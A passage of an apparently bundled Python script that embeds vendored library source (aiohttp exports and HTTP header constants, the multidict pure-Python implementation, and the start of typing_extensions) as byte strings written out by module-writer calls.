TraceRequestChunkSentParams as TraceRequestChunkSentParams,\r\n    TraceRequestEndParams as TraceRequestEndParams,\r\n    TraceRequestExceptionParams as TraceRequestExceptionParams,\r\n    TraceRequestRedirectParams as TraceRequestRedirectParams,\r\n    TraceRequestStartParams as TraceRequestStartParams,\r\n    TraceResponseChunkReceivedParams as TraceResponseChunkReceivedParams,\r\n)\r\n\r\n__all__: Tuple[str, ...] = (\r\n    "hdrs",\r\n    # client\r\n    "BaseConnector",\r\n    "ClientConnectionError",\r\n    "ClientConnectorCertificateError",\r\n    "ClientConnectorError",\r\n    "ClientConnectorSSLError",\r\n    "ClientError",\r\n    "ClientHttpProxyError",\r\n    "ClientOSError",\r\n    "ClientPayloadError",\r\n    "ClientProxyConnectionError",\r\n    "ClientResponse",\r\n    "ClientRequest",\r\n    "ClientResponseError",\r\n    "ClientSSLError",\r\n    "ClientSession",\r\n    "ClientTimeout",\r\n    "ClientWebSocketResponse",\r\n    "ContentTypeError",\r\n    "Fingerprint",\r\n    "InvalidURL",\r\n    "RequestInfo",\r\n    "ServerConnectionError",\r\n    "ServerDisconnectedError",\r\n    "ServerFingerprintMismatch",\r\n    "ServerTimeoutError",\r\n    "TCPConnector",\r\n    "TooManyRedirects",\r\n    "UnixConnector",\r\n    "NamedPipeConnector",\r\n    "WSServerHandshakeError",\r\n    "request",\r\n    # cookiejar\r\n    "CookieJar",\r\n    "DummyCookieJar",\r\n    # formdata\r\n    "FormData",\r\n    # helpers\r\n    "BasicAuth",\r\n    "ChainMapProxy",\r\n    "ETag",\r\n    # http\r\n    "HttpVersion",\r\n    "HttpVersion10",\r\n    "HttpVersion11",\r\n    "WSMsgType",\r\n    "WSCloseCode",\r\n    "WSMessage",\r\n    "WebSocketError",\r\n    # multipart\r\n    "BadContentDispositionHeader",\r\n    "BadContentDispositionParam",\r\n    "BodyPartReader",\r\n    "MultipartReader",\r\n    "MultipartWriter",\r\n    "content_disposition_filename",\r\n    "parse_content_disposition",\r\n    # payload\r\n    "AsyncIterablePayload",\r\n    "BufferedReaderPayload",\r\n    "BytesIOPayload",\r\n    "BytesPayload",\r\n    "IOBasePayload",\r\n    "JsonPayload",\r\n    "PAYLOAD_REGISTRY",\r\n    "Payload",\r\n    "StringIOPayload",\r\n    "StringPayload",\r\n    "TextIOPayload",\r\n    "get_payload",\r\n    "payload_type",\r\n    # payload_streamer\r\n    "streamer",\r\n    # resolver\r\n    "AsyncResolver",\r\n    "DefaultResolver",\r\n    "ThreadedResolver",\r\n    # streams\r\n    "DataQueue",\r\n    "EMPTY_PAYLOAD",\r\n    "EofStream",\r\n    "FlowControlDataQueue",\r\n    "StreamReader",\r\n    # tracing\r\n    "TraceConfig",\r\n    "TraceConnectionCreateEndParams",\r\n    "TraceConnectionCreateStartParams",\r\n    "TraceConnectionQueuedEndParams",\r\n    "TraceConnectionQueuedStartParams",\r\n    "TraceConnectionReuseconnParams",\r\n    "TraceDnsCacheHitParams",\r\n    "TraceDnsCacheMissParams",\r\n    "TraceDnsResolveHostEndParams",\r\n    "TraceDnsResolveHostStartParams",\r\n    "TraceRequestChunkSentParams",\r\n    "TraceRequestEndParams",\r\n    "TraceRequestExceptionParams",\r\n    "TraceRequestRedirectParams",\r\n    "TraceRequestStartParams",\r\n    "TraceResponseChunkReceivedParams",\r\n)\r\n\r\ntry:\r\n    from .worker import GunicornUVLoopWebWorker, GunicornWebWorker\r\n\r\n    __all__ += ("GunicornWebWorker", "GunicornUVLoopWebWorker")\r\nexcept ImportError:  # pragma: no cover\r\n    pass\r\n')
    __stickytape_write_module('aiohttp/hdrs.py', b'"""HTTP Headers constants."""\r\n\r\n# After changing the file content call ./tools/gen.py\r\n# to regenerate the headers parser\r\nimport sys\r\nfrom typing import Set\r\n\r\nfrom multidict import istr\r\n\r\nif sys.version_info >= (3, 8):\r\n    from typing import Final\r\nelse:\r\n    from typing_extensions import Final\r\n\r\nMETH_ANY: Final[str] = "*"\r\nMETH_CONNECT: Final[str] = "CONNECT"\r\nMETH_HEAD: Final[str] = "HEAD"\r\nMETH_GET: Final[str] = "GET"\r\nMETH_DELETE: Final[str] = "DELETE"\r\nMETH_OPTIONS: Final[str] = "OPTIONS"\r\nMETH_PATCH: Final[str] = "PATCH"\r\nMETH_POST: Final[str] = "POST"\r\nMETH_PUT: Final[str] = "PUT"\r\nMETH_TRACE: Final[str] = "TRACE"\r\n\r\nMETH_ALL: Final[Set[str]] = {\r\n    METH_CONNECT,\r\n    METH_HEAD,\r\n    METH_GET,\r\n    METH_DELETE,\r\n    METH_OPTIONS,\r\n    METH_PATCH,\r\n    METH_POST,\r\n    METH_PUT,\r\n    METH_TRACE,\r\n}\r\n\r\nACCEPT: Final[istr] = istr("Accept")\r\nACCEPT_CHARSET: Final[istr] = istr("Accept-Charset")\r\nACCEPT_ENCODING: Final[istr] = istr("Accept-Encoding")\r\nACCEPT_LANGUAGE: Final[istr] = istr("Accept-Language")\r\nACCEPT_RANGES: Final[istr] = istr("Accept-Ranges")\r\nACCESS_CONTROL_MAX_AGE: Final[istr] = istr("Access-Control-Max-Age")\r\nACCESS_CONTROL_ALLOW_CREDENTIALS: Final[istr] = istr("Access-Control-Allow-Credentials")\r\nACCESS_CONTROL_ALLOW_HEADERS: Final[istr] = istr("Access-Control-Allow-Headers")\r\nACCESS_CONTROL_ALLOW_METHODS: Final[istr] = istr("Access-Control-Allow-Methods")\r\nACCESS_CONTROL_ALLOW_ORIGIN: Final[istr] = istr("Access-Control-Allow-Origin")\r\nACCESS_CONTROL_EXPOSE_HEADERS: Final[istr] = istr("Access-Control-Expose-Headers")\r\nACCESS_CONTROL_REQUEST_HEADERS: Final[istr] = istr("Access-Control-Request-Headers")\r\nACCESS_CONTROL_REQUEST_METHOD: Final[istr] = istr("Access-Control-Request-Method")\r\nAGE: Final[istr] = istr("Age")\r\nALLOW: Final[istr] = istr("Allow")\r\nAUTHORIZATION: Final[istr] = istr("Authorization")\r\nCACHE_CONTROL: Final[istr] = istr("Cache-Control")\r\nCONNECTION: Final[istr] = istr("Connection")\r\nCONTENT_DISPOSITION: Final[istr] = istr("Content-Disposition")\r\nCONTENT_ENCODING: Final[istr] = istr("Content-Encoding")\r\nCONTENT_LANGUAGE: Final[istr] = istr("Content-Language")\r\nCONTENT_LENGTH: Final[istr] = istr("Content-Length")\r\nCONTENT_LOCATION: Final[istr] = istr("Content-Location")\r\nCONTENT_MD5: Final[istr] = istr("Content-MD5")\r\nCONTENT_RANGE: Final[istr] = istr("Content-Range")\r\nCONTENT_TRANSFER_ENCODING: Final[istr] = istr("Content-Transfer-Encoding")\r\nCONTENT_TYPE: Final[istr] = istr("Content-Type")\r\nCOOKIE: Final[istr] = istr("Cookie")\r\nDATE: Final[istr] = istr("Date")\r\nDESTINATION: Final[istr] = istr("Destination")\r\nDIGEST: Final[istr] = istr("Digest")\r\nETAG: Final[istr] = istr("Etag")\r\nEXPECT: Final[istr] = istr("Expect")\r\nEXPIRES: Final[istr] = istr("Expires")\r\nFORWARDED: Final[istr] = istr("Forwarded")\r\nFROM: Final[istr] = istr("From")\r\nHOST: Final[istr] = istr("Host")\r\nIF_MATCH: Final[istr] = istr("If-Match")\r\nIF_MODIFIED_SINCE: Final[istr] = istr("If-Modified-Since")\r\nIF_NONE_MATCH: Final[istr] = istr("If-None-Match")\r\nIF_RANGE: Final[istr] = istr("If-Range")\r\nIF_UNMODIFIED_SINCE: Final[istr] = istr("If-Unmodified-Since")\r\nKEEP_ALIVE: Final[istr] = istr("Keep-Alive")\r\nLAST_EVENT_ID: Final[istr] = istr("Last-Event-ID")\r\nLAST_MODIFIED: Final[istr] = istr("Last-Modified")\r\nLINK: Final[istr] = istr("Link")\r\nLOCATION: Final[istr] = istr("Location")\r\nMAX_FORWARDS: Final[istr] = istr("Max-Forwards")\r\nORIGIN: Final[istr] = istr("Origin")\r\nPRAGMA: Final[istr] = istr("Pragma")\r\nPROXY_AUTHENTICATE: Final[istr] = istr("Proxy-Authenticate")\r\nPROXY_AUTHORIZATION: Final[istr] = istr("Proxy-Authorization")\r\nRANGE: Final[istr] = istr("Range")\r\nREFERER: Final[istr] = istr("Referer")\r\nRETRY_AFTER: Final[istr] = istr("Retry-After")\r\nSEC_WEBSOCKET_ACCEPT: Final[istr] = istr("Sec-WebSocket-Accept")\r\nSEC_WEBSOCKET_VERSION: Final[istr] = istr("Sec-WebSocket-Version")\r\nSEC_WEBSOCKET_PROTOCOL: Final[istr] = istr("Sec-WebSocket-Protocol")\r\nSEC_WEBSOCKET_EXTENSIONS: Final[istr] = istr("Sec-WebSocket-Extensions")\r\nSEC_WEBSOCKET_KEY: Final[istr] = istr("Sec-WebSocket-Key")\r\nSEC_WEBSOCKET_KEY1: Final[istr] = istr("Sec-WebSocket-Key1")\r\nSERVER: Final[istr] = istr("Server")\r\nSET_COOKIE: Final[istr] = istr("Set-Cookie")\r\nTE: Final[istr] = istr("TE")\r\nTRAILER: Final[istr] = istr("Trailer")\r\nTRANSFER_ENCODING: Final[istr] = istr("Transfer-Encoding")\r\nUPGRADE: Final[istr] = istr("Upgrade")\r\nURI: Final[istr] = istr("URI")\r\nUSER_AGENT: Final[istr] = istr("User-Agent")\r\nVARY: Final[istr] = istr("Vary")\r\nVIA: Final[istr] = istr("Via")\r\nWANT_DIGEST: Final[istr] = istr("Want-Digest")\r\nWARNING: Final[istr] = istr("Warning")\r\nWWW_AUTHENTICATE: Final[istr] = istr("WWW-Authenticate")\r\nX_FORWARDED_FOR: Final[istr] = istr("X-Forwarded-For")\r\nX_FORWARDED_HOST: Final[istr] = istr("X-Forwarded-Host")\r\nX_FORWARDED_PROTO: Final[istr] = istr("X-Forwarded-Proto")\r\n')
    __stickytape_write_module('multidict/__init__.py', b'"""Multidict implementation.\r\n\r\nHTTP Headers and URL query string require specific data structure:\r\nmultidict. It behaves mostly like a dict but it can have\r\nseveral values for the same key.\r\n"""\r\n\r\nfrom ._abc import MultiMapping, MutableMultiMapping\r\nfrom ._compat import USE_EXTENSIONS\r\n\r\n__all__ = (\r\n    "MultiMapping",\r\n    "MutableMultiMapping",\r\n    "MultiDictProxy",\r\n    "CIMultiDictProxy",\r\n    "MultiDict",\r\n    "CIMultiDict",\r\n    "upstr",\r\n    "istr",\r\n    "getversion",\r\n)\r\n\r\n__version__ = "6.0.2"\r\n\r\n\r\ntry:\r\n    if not USE_EXTENSIONS:\r\n        raise ImportError\r\n    from ._multidict import (\r\n        CIMultiDict,\r\n        CIMultiDictProxy,\r\n        MultiDict,\r\n        MultiDictProxy,\r\n        getversion,\r\n        istr,\r\n    )\r\nexcept ImportError:  # pragma: no cover\r\n    from ._multidict_py import (\r\n        CIMultiDict,\r\n        CIMultiDictProxy,\r\n        MultiDict,\r\n        MultiDictProxy,\r\n        getversion,\r\n        istr,\r\n    )\r\n\r\n\r\nupstr = istr\r\n')
    __stickytape_write_module('multidict/_abc.py', b'import abc\r\nimport sys\r\nimport types\r\nfrom collections.abc import Mapping, MutableMapping\r\n\r\n\r\nclass _TypingMeta(abc.ABCMeta):\r\n    # A fake metaclass to satisfy typing deps in runtime\r\n    # basically MultiMapping[str] and other generic-like type instantiations\r\n    # are emulated.\r\n    # Note: real type hints are provided by __init__.pyi stub file\r\n    if sys.version_info >= (3, 9):\r\n\r\n        def __getitem__(self, key):\r\n            return types.GenericAlias(self, key)\r\n\r\n    else:\r\n\r\n        def __getitem__(self, key):\r\n            return self\r\n\r\n\r\nclass MultiMapping(Mapping, metaclass=_TypingMeta):\r\n    @abc.abstractmethod\r\n    def getall(self, key, default=None):\r\n        raise KeyError\r\n\r\n    @abc.abstractmethod\r\n    def getone(self, key, default=None):\r\n        raise KeyError\r\n\r\n\r\nclass MutableMultiMapping(MultiMapping, MutableMapping):\r\n    @abc.abstractmethod\r\n    def add(self, key, value):\r\n        raise NotImplementedError\r\n\r\n    @abc.abstractmethod\r\n    def extend(self, *args, **kwargs):\r\n        raise NotImplementedError\r\n\r\n    @abc.abstractmethod\r\n    def popone(self, key, default=None):\r\n        raise KeyError\r\n\r\n    @abc.abstractmethod\r\n    def popall(self, key, default=None):\r\n        raise KeyError\r\n')
    __stickytape_write_module('multidict/_compat.py', b'import os\r\nimport platform\r\n\r\nNO_EXTENSIONS = bool(os.environ.get("MULTIDICT_NO_EXTENSIONS"))\r\n\r\nPYPY = platform.python_implementation() == "PyPy"\r\n\r\nUSE_EXTENSIONS = not NO_EXTENSIONS and not PYPY\r\n\r\nif USE_EXTENSIONS:\r\n    try:\r\n        from . import _multidict  # noqa\r\n    except ImportError:\r\n        USE_EXTENSIONS = False\r\n')
    __stickytape_write_module('multidict/_multidict_py.py', b'import sys\r\nimport types\r\nfrom array import array\r\nfrom collections import abc\r\n\r\nfrom ._abc import MultiMapping, MutableMultiMapping\r\n\r\n_marker = object()\r\n\r\nif sys.version_info >= (3, 9):\r\n    GenericAlias = types.GenericAlias\r\nelse:\r\n    def GenericAlias(cls):\r\n        return cls\r\n\r\n\r\nclass istr(str):\r\n\r\n    """Case insensitive str."""\r\n\r\n    __is_istr__ = True\r\n\r\n\r\nupstr = istr  # for relaxing backward compatibility problems\r\n\r\n\r\ndef getversion(md):\r\n    if not isinstance(md, _Base):\r\n        raise TypeError("Parameter should be multidict or proxy")\r\n    return md._impl._version\r\n\r\n\r\n_version = array("Q", [0])\r\n\r\n\r\nclass _Impl:\r\n    __slots__ = ("_items", "_version")\r\n\r\n    def __init__(self):\r\n        self._items = []\r\n        self.incr_version()\r\n\r\n    def incr_version(self):\r\n        global _version\r\n        v = _version\r\n        v[0] += 1\r\n        self._version = v[0]\r\n\r\n    if sys.implementation.name != "pypy":\r\n\r\n        def __sizeof__(self):\r\n            return object.__sizeof__(self) + sys.getsizeof(self._items)\r\n\r\n\r\nclass _Base:\r\n    def _title(self, key):\r\n        return key\r\n\r\n    def getall(self, key, default=_marker):\r\n        """Return a list of all values matching the key."""\r\n        identity = self._title(key)\r\n        res = [v for i, k, v in self._impl._items if i == identity]\r\n        if res:\r\n            return res\r\n        if not res and default is not _marker:\r\n            return default\r\n        raise KeyError("Key not found: %r" % key)\r\n\r\n    def getone(self, key, default=_marker):\r\n        """Get first value matching the key."""\r\n        identity = self._title(key)\r\n        for i, k, v in self._impl._items:\r\n            if i == identity:\r\n                return v\r\n        if default is not _marker:\r\n            return default\r\n        raise KeyError("Key not found: %r" % key)\r\n\r\n    # Mapping interface #\r\n\r\n    def __getitem__(self, key):\r\n        return self.getone(key)\r\n\r\n    def get(self, key, default=None):\r\n        """Get first value matching the key."""\r\n        return self.getone(key, default)\r\n\r\n    def __iter__(self):\r\n        return iter(self.keys())\r\n\r\n    def __len__(self):\r\n        return len(self._impl._items)\r\n\r\n    def keys(self):\r\n        """Return a new view of the dictionary\'s keys."""\r\n        return _KeysView(self._impl)\r\n\r\n    def items(self):\r\n        """Return a new view of the dictionary\'s items *(key, value) pairs)."""\r\n        return _ItemsView(self._impl)\r\n\r\n    def values(self):\r\n        """Return a new view of the dictionary\'s values."""\r\n        return _ValuesView(self._impl)\r\n\r\n    def __eq__(self, other):\r\n        if not isinstance(other, abc.Mapping):\r\n            return NotImplemented\r\n        if isinstance(other, _Base):\r\n            lft = self._impl._items\r\n            rht = other._impl._items\r\n            if len(lft) != len(rht):\r\n                return False\r\n            for (i1, k2, v1), (i2, k2, v2) in zip(lft, rht):\r\n                if i1 != i2 or v1 != v2:\r\n                    return False\r\n            return True\r\n        if len(self._impl._items) != len(other):\r\n            return False\r\n        for k, v in self.items():\r\n            nv = other.get(k, _marker)\r\n            if v != nv:\r\n                return False\r\n        return True\r\n\r\n    def __contains__(self, key):\r\n        identity = self._title(key)\r\n        for i, k, v in self._impl._items:\r\n            if i == identity:\r\n                return True\r\n        return False\r\n\r\n    def __repr__(self):\r\n        body = ", ".join("\'{}\': {!r}".format(k, v) for k, v in self.items())\r\n        return "<{}({})>".format(self.__class__.__name__, body)\r\n\r\n    __class_getitem__ = classmethod(GenericAlias)\r\n\r\n\r\nclass MultiDictProxy(_Base, MultiMapping):\r\n    """Read-only proxy for MultiDict instance."""\r\n\r\n    def __init__(self, arg):\r\n        if not isinstance(arg, (MultiDict, MultiDictProxy)):\r\n            raise TypeError(\r\n                "ctor requires MultiDict or MultiDictProxy instance"\r\n                ", not {}".format(type(arg))\r\n            )\r\n\r\n        self._impl = arg._impl\r\n\r\n    def __reduce__(self):\r\n        raise TypeError("can\'t pickle {} objects".format(self.__class__.__name__))\r\n\r\n    def copy(self):\r\n        """Return a copy of itself."""\r\n        return MultiDict(self.items())\r\n\r\n\r\nclass CIMultiDictProxy(MultiDictProxy):\r\n    """Read-only proxy for CIMultiDict instance."""\r\n\r\n    def __init__(self, arg):\r\n        if not isinstance(arg, (CIMultiDict, CIMultiDictProxy)):\r\n            raise TypeError(\r\n                "ctor requires CIMultiDict or CIMultiDictProxy instance"\r\n                ", not {}".format(type(arg))\r\n            )\r\n\r\n        self._impl = arg._impl\r\n\r\n    def _title(self, key):\r\n        return key.title()\r\n\r\n    def copy(self):\r\n        """Return a copy of itself."""\r\n        return CIMultiDict(self.items())\r\n\r\n\r\nclass MultiDict(_Base, MutableMultiMapping):\r\n    """Dictionary with the support for duplicate keys."""\r\n\r\n    def __init__(self, *args, **kwargs):\r\n        self._impl = _Impl()\r\n\r\n        self._extend(args, kwargs, self.__class__.__name__, self._extend_items)\r\n\r\n    if sys.implementation.name != "pypy":\r\n\r\n        def __sizeof__(self):\r\n            return object.__sizeof__(self) + sys.getsizeof(self._impl)\r\n\r\n    def __reduce__(self):\r\n        return (self.__class__, (list(self.items()),))\r\n\r\n    def _title(self, key):\r\n        return key\r\n\r\n    def _key(self, key):\r\n        if isinstance(key, str):\r\n            return key\r\n        else:\r\n            raise TypeError(\r\n                "MultiDict keys should be either str " "or subclasses of str"\r\n            )\r\n\r\n    def add(self, key, value):\r\n        identity = self._title(key)\r\n        self._impl._items.append((identity, self._key(key), value))\r\n        self._impl.incr_version()\r\n\r\n    def copy(self):\r\n        """Return a copy of itself."""\r\n        cls = self.__class__\r\n        return cls(self.items())\r\n\r\n    __copy__ = copy\r\n\r\n    def extend(self, *args, **kwargs):\r\n        """Extend current MultiDict with more values.\r\n\r\n        This method must be used instead of update.\r\n        """\r\n        self._extend(args, kwargs, "extend", self._extend_items)\r\n\r\n    def _extend(self, args, kwargs, name, method):\r\n        if len(args) > 1:\r\n            raise TypeError(\r\n                "{} takes at most 1 positional argument"\r\n                " ({} given)".format(name, len(args))\r\n            )\r\n        if args:\r\n            arg = args[0]\r\n            if isinstance(args[0], (MultiDict, MultiDictProxy)) and not kwargs:\r\n                items = arg._impl._items\r\n            else:\r\n                if hasattr(arg, "items"):\r\n                    arg = arg.items()\r\n                if kwargs:\r\n                    arg = list(arg)\r\n                    arg.extend(list(kwargs.items()))\r\n                items = []\r\n                for item in arg:\r\n                    if not len(item) == 2:\r\n                        raise TypeError(\r\n                            "{} takes either dict or list of (key, value) "\r\n                            "tuples".format(name)\r\n                        )\r\n                    items.append((self._title(item[0]), self._key(item[0]), item[1]))\r\n\r\n            method(items)\r\n        else:\r\n            method(\r\n                [\r\n                    (self._title(key), self._key(key), value)\r\n                    for key, value in kwargs.items()\r\n                ]\r\n            )\r\n\r\n    def _extend_items(self, items):\r\n        for identity, key, value in items:\r\n            self.add(key, value)\r\n\r\n    def clear(self):\r\n        """Remove all items from MultiDict."""\r\n        self._impl._items.clear()\r\n        self._impl.incr_version()\r\n\r\n    # Mapping interface #\r\n\r\n    def __setitem__(self, key, value):\r\n        self._replace(key, value)\r\n\r\n    def __delitem__(self, key):\r\n        identity = self._title(key)\r\n        items = self._impl._items\r\n        found = False\r\n        for i in range(len(items) - 1, -1, -1):\r\n            if items[i][0] == identity:\r\n                del items[i]\r\n                found = True\r\n        if not found:\r\n            raise KeyError(key)\r\n        else:\r\n            self._impl.incr_version()\r\n\r\n    def setdefault(self, key, default=None):\r\n        """Return value for key, set value to default if key is not present."""\r\n        identity = self._title(key)\r\n        for i, k, v in self._impl._items:\r\n            if i == identity:\r\n                return v\r\n        self.add(key, default)\r\n        return default\r\n\r\n    def popone(self, key, default=_marker):\r\n        """Remove specified key and return the corresponding value.\r\n\r\n        If key is not found, d is returned if given, otherwise\r\n        KeyError is raised.\r\n\r\n        """\r\n        identity = self._title(key)\r\n        for i in range(len(self._impl._items)):\r\n            if self._impl._items[i][0] == identity:\r\n                value = self._impl._items[i][2]\r\n                del self._impl._items[i]\r\n                self._impl.incr_version()\r\n                return value\r\n        if default is _marker:\r\n            raise KeyError(key)\r\n        else:\r\n            return default\r\n\r\n    pop = popone  # type: ignore\r\n\r\n    def popall(self, key, default=_marker):\r\n        """Remove all occurrences of key and return the list of corresponding\r\n        values.\r\n\r\n        If key is not found, default is returned if given, otherwise\r\n        KeyError is raised.\r\n\r\n        """\r\n        found = False\r\n        identity = self._title(key)\r\n        ret = []\r\n        for i in range(len(self._impl._items) - 1, -1, -1):\r\n            item = self._impl._items[i]\r\n            if item[0] == identity:\r\n                ret.append(item[2])\r\n                del self._impl._items[i]\r\n                self._impl.incr_version()\r\n                found = True\r\n        if not found:\r\n            if default is _marker:\r\n                raise KeyError(key)\r\n            else:\r\n                return default\r\n        else:\r\n            ret.reverse()\r\n            return ret\r\n\r\n    def popitem(self):\r\n        """Remove and return an arbitrary (key, value) pair."""\r\n        if self._impl._items:\r\n            i = self._impl._items.pop(0)\r\n            self._impl.incr_version()\r\n            return i[1], i[2]\r\n        else:\r\n            raise KeyError("empty multidict")\r\n\r\n    def update(self, *args, **kwargs):\r\n        """Update the dictionary from *other*, overwriting existing keys."""\r\n        self._extend(args, kwargs, "update", self._update_items)\r\n\r\n    def _update_items(self, items):\r\n        if not items:\r\n            return\r\n        used_keys = {}\r\n        for identity, key, value in items:\r\n            start = used_keys.get(identity, 0)\r\n            for i in range(start, len(self._impl._items)):\r\n                item = self._impl._items[i]\r\n                if item[0] == identity:\r\n                    used_keys[identity] = i + 1\r\n                    self._impl._items[i] = (identity, key, value)\r\n                    break\r\n            else:\r\n                self._impl._items.append((identity, key, value))\r\n                used_keys[identity] = len(self._impl._items)\r\n\r\n        # drop tails\r\n        i = 0\r\n        while i < len(self._impl._items):\r\n            item = self._impl._items[i]\r\n            identity = item[0]\r\n            pos = used_keys.get(identity)\r\n            if pos is None:\r\n                i += 1\r\n                continue\r\n            if i >= pos:\r\n                del self._impl._items[i]\r\n            else:\r\n                i += 1\r\n\r\n        self._impl.incr_version()\r\n\r\n    def _replace(self, key, value):\r\n        key = self._key(key)\r\n        identity = self._title(key)\r\n        items = self._impl._items\r\n\r\n        for i in range(len(items)):\r\n            item = items[i]\r\n            if item[0] == identity:\r\n                items[i] = (identity, key, value)\r\n                # i points to last found item\r\n                rgt = i\r\n                self._impl.incr_version()\r\n                break\r\n        else:\r\n            self._impl._items.append((identity, key, value))\r\n            self._impl.incr_version()\r\n            return\r\n\r\n        # remove all tail items\r\n        i = rgt + 1\r\n        while i < len(items):\r\n            item = items[i]\r\n            if item[0] == identity:\r\n                del items[i]\r\n            else:\r\n                i += 1\r\n\r\n\r\nclass CIMultiDict(MultiDict):\r\n    """Dictionary with the support for duplicate case-insensitive keys."""\r\n\r\n    def _title(self, key):\r\n        return key.title()\r\n\r\n\r\nclass _Iter:\r\n    __slots__ = ("_size", "_iter")\r\n\r\n    def __init__(self, size, iterator):\r\n        self._size = size\r\n        self._iter = iterator\r\n\r\n    def __iter__(self):\r\n        return self\r\n\r\n    def __next__(self):\r\n        return next(self._iter)\r\n\r\n    def __length_hint__(self):\r\n        return self._size\r\n\r\n\r\nclass _ViewBase:\r\n    def __init__(self, impl):\r\n        self._impl = impl\r\n\r\n    def __len__(self):\r\n        return len(self._impl._items)\r\n\r\n\r\nclass _ItemsView(_ViewBase, abc.ItemsView):\r\n    def __contains__(self, item):\r\n        assert isinstance(item, tuple) or isinstance(item, list)\r\n        assert len(item) == 2\r\n        for i, k, v in self._impl._items:\r\n            if item[0] == k and item[1] == v:\r\n                return True\r\n        return False\r\n\r\n    def __iter__(self):\r\n        return _Iter(len(self), self._iter(self._impl._version))\r\n\r\n    def _iter(self, version):\r\n        for i, k, v in self._impl._items:\r\n            if version != self._impl._version:\r\n                raise RuntimeError("Dictionary changed during iteration")\r\n            yield k, v\r\n\r\n    def __repr__(self):\r\n        lst = []\r\n        for item in self._impl._items:\r\n            lst.append("{!r}: {!r}".format(item[1], item[2]))\r\n        body = ", ".join(lst)\r\n        return "{}({})".format(self.__class__.__name__, body)\r\n\r\n\r\nclass _ValuesView(_ViewBase, abc.ValuesView):\r\n    def __contains__(self, value):\r\n        for item in self._impl._items:\r\n            if item[2] == value:\r\n                return True\r\n        return False\r\n\r\n    def __iter__(self):\r\n        return _Iter(len(self), self._iter(self._impl._version))\r\n\r\n    def _iter(self, version):\r\n        for item in self._impl._items:\r\n            if version != self._impl._version:\r\n                raise RuntimeError("Dictionary changed during iteration")\r\n            yield item[2]\r\n\r\n    def __repr__(self):\r\n        lst = []\r\n        for item in self._impl._items:\r\n            lst.append("{!r}".format(item[2]))\r\n        body = ", ".join(lst)\r\n        return "{}({})".format(self.__class__.__name__, body)\r\n\r\n\r\nclass _KeysView(_ViewBase, abc.KeysView):\r\n    def __contains__(self, key):\r\n        for item in self._impl._items:\r\n            if item[1] == key:\r\n                return True\r\n        return False\r\n\r\n    def __iter__(self):\r\n        return _Iter(len(self), self._iter(self._impl._version))\r\n\r\n    def _iter(self, version):\r\n        for item in self._impl._items:\r\n            if version != self._impl._version:\r\n                raise RuntimeError("Dictionary changed during iteration")\r\n            yield item[1]\r\n\r\n    def __repr__(self):\r\n        lst = []\r\n        for item in self._impl._items:\r\n            lst.append("{!r}".format(item[1]))\r\n        body = ", ".join(lst)\r\n        return "{}({})".format(self.__class__.__name__, body)\r\n')
    __stickytape_write_module('typing_extensions.py', b'import abc\nimport collections\nimport collections.abc\nimport functools\nimport operator\nimport sys\nimport types as _types\nimport typing\n\n\n# Please keep __all__ alphabetized within each category.\n__all__ = [\n    # Super-special typing primitives.\n    \'ClassVar\',\n    \'Concatenate\',\n    \'Final\',\n    \'LiteralString\',\n    \'ParamSpec\',\n    \'ParamSpecArgs\',\n    \'ParamSpecKwargs\',\n    \'Self\',\n    \'Type\',\n    \'TypeVarTuple\',\n    \'Unpack\',\n\n    # ABCs (from collections.abc).\n    \'Awaitable\',\n    \'AsyncIterator\',\n    \'AsyncIterable\',\n    \'Coroutine\',\n    \'AsyncGenerator\',\n    \'AsyncContextManager\',\n    \'ChainMap\',\n\n    # Concrete collection types.\n    \'ContextManager\',\n    \'Counter\',\n    \'Deque\',\n    \'DefaultDict\',\n    \'OrderedDict\',\n    \'TypedDict\',\n\n    # Structural checks, a.k.a. protocols.\n    \'SupportsIndex\',\n\n    # One-off things.\n    \'Annotated\',\n    \'assert_never\',\n    \'assert_type\',\n    \'clear_overloads\',\n    \'dataclass_transform\',\n    \'get_overloads\',\n    \'final\',\n    \'get_args\',\n    \'get_origin\',\n    \'get_type_hints\',\n    \'IntVar\',\n    \'is_typeddict\',\n    \'Literal\',\n    \'NewType\',\n    \'overload\',\n    \'Protocol\',\n    \'reveal_type\',\n    \'runtime\',\n    \'runtime_checkable\',\n    \'Text\',\n    \'TypeAlias\',\n    \'TypeGuard\',\n    \'TYPE_CHECKING\',\n    \'Never\',\n    \'NoReturn\',\n    \'Required\',\n    \'NotRequired\',\n]\n\n# for backward compatibility\nPEP_560 = True\nGenericMeta = type\n\n# The functions below are modified copies of typing internal helpers.\n# They are needed by _ProtocolMeta and they provide support for PEP 646.\n\n_marker = object()\n\n\ndef _check_generic(cls, parameters, elen=_marker):\n    """Check correct count for parameters of a generic cls (internal helper).\n    This gives a nice error message in case of count mismatch.\n    """\n    if not elen:\n        raise TypeError(f"{cls} is not a generic class")\n    if elen is _marker:\n        if not hasattr(cls, "__parameters__") or not cls.__parameters__:\n            raise TypeError(f"{cls} is not a generic class")\n        elen = len(cls.__parameters__)\n    alen = len(parameters)\n    if alen != elen:\n        if hasattr(cls, "__parameters__"):\n            parameters = [p for p in cls.__parameters__ if not _is_unpack(p)]\n            num_tv_tuples = sum(isinstance(p, TypeVarTuple) for p in parameters)\n            if (num_tv_tuples > 0) and (alen >= elen - num_tv_tuples):\n                return\n        raise TypeError(f"Too {\'many\' if alen > elen else \'few\'} parameters for {cls};"\n                        f" actual {alen}, expected {elen}")\n\n\nif sys.version_info >= (3, 10):\n    def _should_collect_from_parameters(t):\n        return isinstance(\n            t, (typing._GenericAlias, _types.GenericAlias, _types.UnionType)\n        )\nelif sys.version_info >= (3, 9):\n    def _should_collect_from_parameters(t):\n        return isinstance(t, (typing._GenericAlias, _types.GenericAlias))\nelse:\n    def _should_collect_from_parameters(t):\n        return isinstance(t, typing._GenericAlias) and not t._special\n\n\ndef _collect_type_vars(types, typevar_types=None):\n    """Collect all type variable contained in types in order of\n    first appearance (lexicographic order). For example::\n\n        _collect_type_vars((T, List[S, T])) == (T, S)\n    """\n    if typevar_types is None:\n        typevar_types = typing.TypeVar\n    tvars = []\n    for t in types:\n        if (\n            isinstance(t, typevar_types) and\n            t not in tvars and\n            not _is_unpack(t)\n        ):\n            tvars.append(t)\n        if _should_collect_from_parameters(t):\n            tvars.extend([t for t in t.__parameters__ if t not in tvars])\n    return tuple(tvars)\n\n\nNoReturn = typing.NoReturn\n\n# Some unconstrained type variables.  These are used by the container types.\n# (These are not for export.)\nT = typing.TypeVar(\'T\')  # Any type.\nKT = typing.TypeVar(\'KT\')  # Key type.\nVT = typing.TypeVar(\'VT\')  # Value type.\nT_co = typing.TypeVar(\'T_co\', covariant=True)  # Any type covariant containers.\nT_contra = 